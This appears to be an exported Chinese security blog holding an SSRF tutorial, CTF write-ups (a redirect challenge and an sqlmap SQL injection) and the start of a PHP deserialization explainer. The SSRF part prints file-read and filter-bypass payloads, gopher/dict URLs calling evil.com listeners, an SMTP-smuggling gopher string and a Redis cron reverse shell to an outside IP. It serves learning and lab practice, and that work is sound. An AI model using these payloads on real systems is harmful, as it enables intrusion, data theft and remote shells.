?&gt;\n2、fsockopen():\n以下代码使用fsockopen函数实现获取用户指定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。\n定义：打开一个网络连接或者一个Unix套接字连接参数\t描述hostname\t安装了OpenSSL，添加访问协议ssl://或者是tls://，从而可以使用基于TCP/IP协议的SSL或者TLS的客户端连接到远程主机port\t端口号。如果对该参数传一个-1，则表示不使用端口，例如unix://errno\t如果errno的返回值为0，而且这个函数的返回值为false，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误errstr\t错误信息将以字符串的信息返回。timeout\t设置连接的时限，单位为秒。\n&lt;?php function GetFile($host,$port,$link) &#123;     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);     if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \\n&quot;;     &#125;else &#123;         $out = &quot;GET $link HTTP/1.1\\r\\n&quot;;         $out .= &quot;Host: $host\\r\\n&quot;;         $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;;         $out .= &quot;\\r\\n&quot;;         fwrite($fp, $out);         $contents=&#x27;&#x27;;         while (!feof($fp)) &#123;             $contents.= fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;\n3、curl_exec():支持多种协议\ncURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。\n定义：执行一个cURL会话参数：ch  由 curl_init() 返回的 cURL 句柄。用法：抓取URL并把它传递给浏览器 curl_exec($ch)\n&lt;?php if (isset($_POST[&#x27;url&#x27;]))&#123;$link = $_POST[&#x27;url&#x27;];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj); $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;file_put_contents($filename, $result); echo $result;&#125;?&gt;\n注意事项\n一般情况下PHP不会开启fopen的gopher wrapperfile_get_contents的gopher协议不能URL编码file_get_contents关于Gopher的302跳转会出现bug，导致利用失败curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用curl_exec() 默认不跟踪跳转，file_get_contents()支持php://input协议\n五、SSRF中URL的伪协议\nredis服务是在6379端口开启的\n浅浅了解一下redis服务\n\n浅浅了解一下curl命令\ncurl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思\n不带有任何参数时，curl 就是发出 GET 请求\n$ curl https://www.example.com\n上面命令向www.example.com发出 GET 请求，服务器返回的内容会在命令行输出\n-v参数输出通信的整个过程，用于调试。我们便可以利用-v参数进行读取文件\n使用file协议curl -v file:///etc/passwd使用ftp协议 curl -v &quot;ftp://127.0.0.1:端口/info&quot;使用dict协议 curl -v &quot;dict://127.0.0.1:端口/info&quot;使用gopher协议 curl -v &quot;gopher://127.0.0.1:端口/_info&quot;\n其他参数可以参考curl\n常见内网IP段\n局域网地址范围分三类，以下IP段为内网IP段：\nC类：192.168.0.0 - 192.168.255.255 B类：172.16.0.0 - 172.31.255.255 A类：10.0.0.0 - 10.255.255.255\n当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议\nfile:/// 从文件系统中获取文件内容，如，file:///etc/passwddict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：sftp:// SSH文件传输协议或安全文件传输协议ldap:// 轻量级目录访问协议tftp:// 简单文件传输协议gopher:// 分布式文档传递服务，可使用gopherus生成payload\n5.1 file\n这种URL Schema可以尝试从文件系统中获取文件：\nhttp://example.com/ssrf.php?url=file:///etc/passwd\nhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini\n\n如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：\n5.2 dict\n这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表。\nDICT协议,一个字典服务器协议,A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号:2628。\nhttp://example.com/ssrf.php?dict://evil.com:1337/\nevil.com:$ nc -lvp 1337\nConnection from [192.168.0.12] port 1337[tcp/*]\naccepted (family 2, sport 31126)CLIENT libcurl 7.40.0\n\n5.3 sftp\n在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。\nhttp://example.com/ssrf.php?url=sftp://evil.com:1337/\nevil.com:$ nc -lvp 1337\nConnection from [192.168.0.12] port 1337[tcp/*]\naccepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2\n\n5.4 ldap://或ldaps:// 或ldapi://\nLDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。\nhttp://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit\n\n5.5 tftp://\nTFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。\nhttp://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET\nevil.com:# nc -lvup 1337\nListening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3\n\n5.6 gopher://\nGopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。\nGopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。\nhttp://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?&gt;\nevil.com:# nc -lvp 1337\nListening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest\n\n六、SSRF漏洞利用（危害）\n1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;\n2.攻击运行在内网或本地的应用程序（比如溢出）;\n3.对内网web应用进行指纹识别，通过访问默认文件实现;\n4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;\n5.利用file协议读取本地文件等。.\n6.各个协议调用探针：http,file,dict,ftp,gopher等\nhttp:192.168.64.144/phpmyadmin/file:///D:/www.txtdict://192.168.64.144:3306/infoftp://192.168.64.144:21\n七、漏洞的验证：\n根据漏洞产生的原理，对所我们所测试的地方进行一个分析\n\n首先这个地方应该是服务器A请求访问以外的服务端B，而不是客户端向服务器A发起请求\n\n使用排除法：看URL地址中有没有包含其他URL地址，再看数据包的请求\n\n方法一：对URL地址进行分析\n我在网上随便找了一张图片，右键新标签打开后\n对URL地址进行了解码，就看见了2个包含的URL地址\n\n方法二：对数据包进行分析\n其实也可以使用burpsuite抓包进行分析\n这里直接看见了文件的URL是其他网站来的\n\n八、利用步骤\n第一步：分析是否可能存在SSRF\n（一般要测试3个函数curl_exec、file_get_content、fsockopen是否能执行成功）\n第二步：测试是哪种函数引起的SSRF漏洞\n对端口进行一个探测（http协议），能够探测到内容，说明存在SSRF漏洞，并且进一步尝试其他操作内网应用指纹识别（http协议）读取文件（file协议）\n具体参考：https://blog.csdn.net/qq_53079406/article/details/124005258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168112506716800215018171%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168112506716800215018171&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-124005258-null-null.142\n九、绕过方式\n部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：\n一、常见的绕过方式\n1、限制为http://www.xxx.com 域名时（利用@与/#/）\n可以尝试采用http基本身份认证的方式绕过\n如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异\n在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。\n\n/#/符:绕过后缀\n一般用于.jpg等固定后缀不可更改\n例如http://10.10.10.10:5001/#/abc.jpg，实际在浏览器访问的是 http://10.10.10.10:5001\n\n2.采用短网址绕过\n比如百度短地址https://dwz.cn/\n\n3.采用进制转换\n127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.\n\nIP地址转为八、十、十六进制及IP地址省略写法（以下均代表127.0.0.1）\n\n   0177.00.00.01\n   2130706433\n   0x7f.0x0.0x0.0x1\n   127.1\n\n\n4.利用特殊域名\n原理是DNS解析。xip.io可以指向任意域名，即\n127.0.0.1.xip.io，可解析为127.0.0.1\n(xip.io 现在好像用不了了，可以找找其他的)\n\nhttp://www.owasp.org.127.0.0.1.xip.io/\n\n5.利用[::]绕过localhost\n可以利用[::]来绕过localhost\nhttp://169.254.169.254&gt;&gt;http://[::169.254.169.254]\nhttp://[::1]\nhttp://[::]:80/\nhttp://0:80\n\n6.利用句号\n127。0。0。1 &gt;&gt;&gt; 127.0.0.1\n\n7.CRLF 编码绕过\n%0d-&gt;0x0d-&gt;\\r回车\n\n%0a-&gt;0x0a-&gt;\\n换行\n\n进行HTTP头部注入\nexample.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a \n\n8.利用封闭的字母数字\n利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com\nhttp://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳\n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇\n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛\n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵\nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ\nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ\n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴\n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n\n9.配置域名\n手上有可控域名，可将域名指向想要请求的IP\n10.库绕过\n利用检测时使用的URL parse库与请求时使用的parse库的差异绕过，如 http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/ 不同的parse库的解析结果不一样\nurllib2 : 1.1.1.1\n\nrequests + browsers : 2.2.2.2\n\nurllib : 3.3.3.3\n\n11.dns重定向绕过\n一般进行 ssrf 防御的模式如下：\n\n1. 获取到输入的URL，从该URL中提取host   对该host进行DNS解析，获取到解析的IP2. 访问规则判断该IP是否在指定范围内（即判断IP是否符合规则）   如果IP在范围内，即对此URL发起请求   如果IP不在范围内，则请求失败\n然而访问规则在判段得到的IP为指定范围内IP，到服务端请求URL这个中间还存在一个细微的时间差，\nDNS重绑定则是利用这一点，让服务器第一次解析host的ip为符合规则的公网IP，在第二次请求解析URL时host的ip又变为了不符合规则的内网IP，从而进行ssrf。\n这里推荐使用burpsuite的intruder模块，来批量发送请求，以利用时间差完成ssrf。\n\n在线DNS重绑定平台：https://lock.cmpxchg8b.com/rebinder.html\n12.攻击本地\nhttp://127.0.0.1:80http://localhost:22\n13.利用上传\n也不一定是上传，我也说不清，自己体会 -.-修改&quot;type=file&quot;为&quot;type=url&quot;比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF\n14.利用协议\nDict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a\n15.302重定向\n需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中\n服务端代码如下：\n&lt;?php header(&quot;Location: http://192.168.1.10&quot;);exit(); ?&gt;\n16.使用组合\n各种绕过进行自由组合即可\n十、SSRF漏防御\n通常有以下5个思路：\n1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。\n3.限制请求的端口为http常用的端口，比如，80,443,8080,8090。\n4.黑名单内网，避免应用被用来获取获取内网数据，攻击内网。\n5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。\n6.去除url中的特殊字符\n7.不跟随30x跳转（跟随跳转需要从1开始重新检测）\n8.请求时设置host header为ip\n十一、靶场实战\n1. SSRF-curl\n第一步：分析是否可能存在SSRF\n（一般要测试3个函数curl_exec、file_get_content、fsockopen是否能执行成功）\n点击它\n\n发现是URL传递的\n（如果无法显示，就在127.0.0.1后面加上端口号）\n\n第二步：测试是哪种函数引起的SSRF漏洞\n这是个SSRF（curl）靶场，就不做过多测试\n函数不同所支持的功能也存在差别\n对端口进行一个探测（http协议）(当然实战过程中肯定要对端口进行爆破，响应时间长的端口就是可以访问的端口)\nhttp://localhost:8080/pikachu-master/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306\n\n能够探测到内容，说明存在SSRF漏洞，并且进一步尝试其他操作\n内网应用指纹识别（http协议）\n（这个我在尝试的时候，如果原文件带了版本号，读取的时候也要带，大小写不一样不影响）\n\n读取文件（file协议）\n\n2. SSRF-file_get_contents\n第一步：判断是否存在SSRF漏洞\n上一题是url，这一题是file函数\n但是操作还是基本类似\n\n8.2.2、第二步：利用漏洞\n读取php源码\nhttp://localhost:8080/pikachu-master/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php\n再使用base64解密即可得到源码\n&lt;?php/** * Created by runner.han * There is nothing new under the sun */$SELF_PAGE = substr($_SERVER[&#x27;PHP_SELF&#x27;],strrpos($_SERVER[&#x27;PHP_SELF&#x27;],&#x27;/&#x27;)+1);if ($SELF_PAGE = &quot;ssrf.php&quot;)&#123;    $ACTIVE = array(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;active open&#x27;,&#x27;active&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);&#125;$PIKA_ROOT_DIR =  &quot;../../&quot;;include_once $PIKA_ROOT_DIR.&#x27;header.php&#x27;;?&gt;&lt;div class=&quot;main-content&quot;&gt;    &lt;div class=&quot;main-content-inner&quot;&gt;        &lt;div class=&quot;breadcrumbs ace-save-state&quot; id=&quot;breadcrumbs&quot;&gt;            &lt;ul class=&quot;breadcrumb&quot;&gt;                &lt;li&gt;                    &lt;i class=&quot;ace-icon fa fa-home home-icon&quot;&gt;&lt;/i&gt;                    &lt;a href=&quot;ssrf.php&quot;&gt;&lt;/a&gt;                &lt;/li&gt;                &lt;li class=&quot;active&quot;&gt;概述&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class=&quot;page-content&quot;&gt;         &lt;b&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造)&lt;/b&gt;         &lt;p&gt;其形成的原因大都是由于服务端&lt;b&gt;提供了从其他服务器应用获取数据的功能&lt;/b&gt;,但又没有对目标地址做严格过滤与限制&lt;/p&gt;            导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据&lt;br&gt;            &lt;br&gt;            数据流:攻击者-----&gt;服务器----&gt;目标地址&lt;br&gt;            &lt;br&gt;            根据后台使用的函数的不同,对应的影响和利用方法又有不一样            &lt;pre style=&quot;width: 500px;&quot;&gt;PHP中下面函数的使用不当会导致SSRF:file_get_contents()fsockopen()curl_exec()            &lt;/pre&gt;&lt;br&gt;            如果一定要通过后台服务器远程去对用户指定(&quot;或者预埋在前端的请求&quot;)的地址进行资源请求,&lt;b&gt;则请做好目标地址的过滤&lt;/b&gt;。&lt;br&gt;            &lt;br&gt;            你可以根据&quot;SSRF&quot;里面的项目来搞懂问题的原因        &lt;/div&gt;&lt;!-- /.page-content --&gt;    &lt;/div&gt;&lt;/div&gt;&lt;!-- /.main-content --&gt;&lt;?phpinclude_once $PIKA_ROOT_DIR . &#x27;footer.php&#x27;;?&gt;\n读取本地host等文件\nhttp://localhost:8080/pikachu-master/vul/ssrf/ssrf_fgc.php?file=file://c:\\windows\\system32\\drivers\\etc\\hosts\n\n3. SSRF-lab实战\n可利用的主要就几个协议吧file 协议结合目录遍历读取文件。gopher 协议打开端口。dict 协议主要用于结合 curl 攻击。http 协议进行内网探测。\nSSRF-Lab 搭建教程：https://drun1baby.top/2022/05/16/SSRF-Lab环境搭建/\n3.1 file协议利用\n使用 file 协议进行的任意文件读取算是 ssrf 最简单的利用方式了\n首先先写一段有 ssrf 漏洞的代码，命名为 ssrf.php 并部署到服务器上。\n\n用 file 协议简单测试一下，可以看到能成功利用 ssrf 漏洞读取文件。file 协议的格式为：file:// 文件路径\n这里不知道为什么我的服务器读取不到内网文件，先借用佬的图片了\n\nPayload\nfile:///etc/passwd  # file:// 之后可以接任意文件\n这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。\nhttp://ip/index.php?url=file:///etc/passwd\n而在 SSRF-Lab 当中较简单，在框中输入file:///etc/passwd即可。\n\n除此之外，利用这个协议可以读取主机内任意文件。接下来可以读取配置文件和源代码方便进一步的渗透，这里之所以成功实现是因为URL没有经过严格的过滤，所以才可以利用这个协议进行任意文件读取。\n3.2 http协议研究\nhttp 协议的利用也很简单，就是向目标发送 http 请求，由于 get 请求的参数是直接加在 url 里的，所以可以探测内网那些使用 get 请求即可攻击的应用。\n\n使用 nc 可以接收到发送的 http 数据包，结构非常简单。\n\n\n3.3 dict 协议的使用\n利用dict协议，dict://ip/info可获取本地redis服务配置信息。\n如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server，具体可见 redis 与 dict 协议\n在上面还介绍过redis服务，看了很多SSRF 协议中的利用都是结合 Redis 服务的，所以这里就先在ssrf-basics 容器里面安装该服务\n$ docker ps #查看容器编号$ docker exec -it 容器编号 /bin/bash #进入容器$ apt-get install redis-server # 安装redis服务$ redis-server #开启redis服务\n\n安装好之后，便可以利用协议收集信息及反弹 shell\n利用dict协议，dict://127.0.0.1:6379/info可获取本地redis服务配置信息\n这里大概是因为6379是其默认端口\n\n用 nc 在测试机监听，然后利用 ssrf 漏洞测试一下 dict 协议发送字符串 info，看看接收方会收到什么：\n\n\n可以看到一共收到了三行数据，第一行是版本号，第二行是我们发送的数据，第三行是自动添加的 QUIT。\ndict 协议不支持换行符，没有办法进行换行，相当于一次只能执行一条命令，所以不能用来攻击那些需要交互的应用（比如需要认证的 redis）。\n\n3.4 gopher 协议的使用\n首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议\nredis-cli -h $1 flushallecho -e &quot;\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\\n\\n&quot;|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save//redis-cli查看所有的keys及清空所有的数据\n这便是常见的exp，只需自己更改IP和端口即可，改成适配于Gopher协议的 URL：\ngopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/185.243.241.45/5555 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a\n经过url解码便是：\ngopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/185.243.241.45/5555 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/spool/cron/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit\n进行测试，成功回显\n\n接下来在 ssrf-lab/basics 容器里面查看插入的 KEY 值，验证是否成功\n\n利用Gopher 协议还可以攻击 FastCGI，攻击内网 Vulnerability Web\n高级文章：https://xz.aliyun.com/t/9554#toc-10\n需要发送多行数据时，就要用到 gopher 协议，同样使用 nc 简单测试一下，可以看到接收端成功接收到了换行的数据，所以 gopher 协议可以用来攻击那些需要交互的应用。\n至于这个 _ 符号暂时不知道为何要+，下面结论有解释\n\n\n结论：\n1、gopher 协议会吃掉第一个字符，所以要先放一个没有用的字符2、回车是 \\r\\n，但如果直接对 \\r\\n 进行 url 编码结果是不对的，因为编码的是 \\ r \\ n 四个字符的结果，实际回车只是两个不可见的字符，url 编码为 %0d%0a3、直接发 % 可以正常接收，但是发 %0d%0a 就会出现数据包发不出去的问题，还需要进行一次 url 编码成 %250d%250a 才能正常发送出去（直接用 curl 命令测试没这个问题，应该是 web 服务器会自动进行一次 url 解码导致的）\n3.5 Weblogic SSRF漏洞\n参考：https://xz.aliyun.com/t/7333#toc-5\n3.6 更多攻击对象\n参考：https://blog.chaitin.cn/gopher-attack-surfaces/\n","categories":["常见top漏洞"]},{"title":"攻防世界-baby_web","url":"/2023/07/27/baby_web/","content":"题目描述：\n想想初始页面是哪个\n题目解题：\n进入首页发现如图\n\n题目告诉我们想想初始页面在哪，那很明显就是让我们访问index.php，于是我们访问index.php看看，访问之后发现其很快就跳转到1.php，所以我们F12看看网络情况，如下图，打开后继续访问index.php发现如下图，结果是被重定向了\n\n那我们bp抓包看看，访问index.php抓包\n\n成功截取到flag\n","categories":["攻防世界"]},{"title":"攻防世界-inget","url":"/2023/07/27/inget/","content":"题目描述：\n无\n题目解题：\n根据题目名称，大概率是一个get型sql注入\n尝试手工注入\nbp抓包，先尝试如下\n?id=1&#x27; and 1=1-- -?id=1&#x27; and 1=2-- -?id=1&#x27; or 1=2-- -\n都均无回显\n尝试：?id=1' or 1=1-- -\n成功回显\n\n尝试sqlmap注入\n第一步：sqlmap -u “http://61.147.171.105:55796/?id=1” -dbs\n\n发现如图所示的敏感数据库名cyber\n查看cyber表中数据\n第二步：sqlmap -u &quot;http://61.147.171.105:55796/?id=1&quot;  -T cyber --dump\n\n发现flag\n","categories":["攻防世界"]},{"title":"浅析反序列化","url":"/2023/07/27/%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"PHP反序列化\n0x01 简介\n什么是序列化？\n对象转换成字符串\n为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等\n什么是反序列化？\n字符串转换成对象\nphp序列化和反序列化的函数：\n序列化：serialize()\n反序列化：unserialize()\ntip：对字符串进行序列化后是它本身**（ctfshow web260）**\n源码：\n&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;    echo $flag;&#125;//因此直接?ctfshow=/ctfshow_i_love_36D/   即可\n0X02 为何要 PHP 的序列化和反序列化\n看到这里，肯定会有人问这个问题，如果说 json 是为了传递数据的方便性，那么 PHP 的序列化又是为了什么呢？\n当然，传递数据的方便肯定是这种压缩并格式化存储的一大共同的属性，那么序列化除了这种属性以外还有什么特性呢？要是只是这样那干脆不如直接用 json 好了，当然有，从上面的实验中你没发现吗？我们把一个实例化的对象长久地存储在了计算机的磁盘上，无论什么时候调用都能恢复原来的样子，这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 